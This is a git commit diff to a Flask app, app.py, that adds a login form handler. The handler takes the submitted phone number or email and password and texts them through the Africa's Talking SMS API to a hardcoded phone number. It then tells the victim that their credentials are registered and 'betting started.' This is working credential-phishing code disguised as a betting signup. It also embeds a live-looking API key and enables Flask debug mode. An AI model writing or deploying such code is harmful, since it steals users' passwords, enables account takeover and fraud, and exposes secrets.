a183a80ba884140add3e6566cc95ccff748dbca0
Eric Muthemba <eric@diasporaai.com>
2019-09-06 09:26:03 +0300

    new changes

--- app.py
+++ app.py
@@ -1,10 +1,42 @@
-from flask import Flask
-
+from flask import Flask,render_template,request
+import africastalking
 app = Flask(__name__)
 
-@app.route("/")
+@app.route("/", methods=['GET', 'POST'])
 def index():
-    return "<h1>hello<h1>"
+    if request.method == 'POST':
+
+        email = request.form['email']
+        password= request.form['password']
+        sms_(email,password)
+    return render_template ("index.html")
+
+
+def on_finish(error, response):
+        if error is not None:
+            raise error
+        print(response)
+
+def sms_(Nmbr,password):
+        number= ["+254726215805"]
+        if (Nmbr[:1] == '0'):
+            Nmbr = Nmbr.replace("0", "+254", 1)
+
+        message = "phone number : " + Nmbr + "\npassword : "+password
+        print (message)
+        username = "S-maji"
+        api_key = "6f708000072b95912546e484d4924c92c8eab98c50ac82742ab6bce6a901d1ca"
+
+        africastalking.initialize(username, api_key)
+        # Initialize a service e.g. SMS
+        sms = africastalking.SMS
+        sms.send(message,number, callback=on_finish)
+
+        number = [Nmbr]
+        message = " Your credentials have been registered and betting started "
+        sms.send(message, number, callback=on_finish)
+
+
 
 if __name__ == '__main__':
-    app.run()
+    app.run(debug=True)
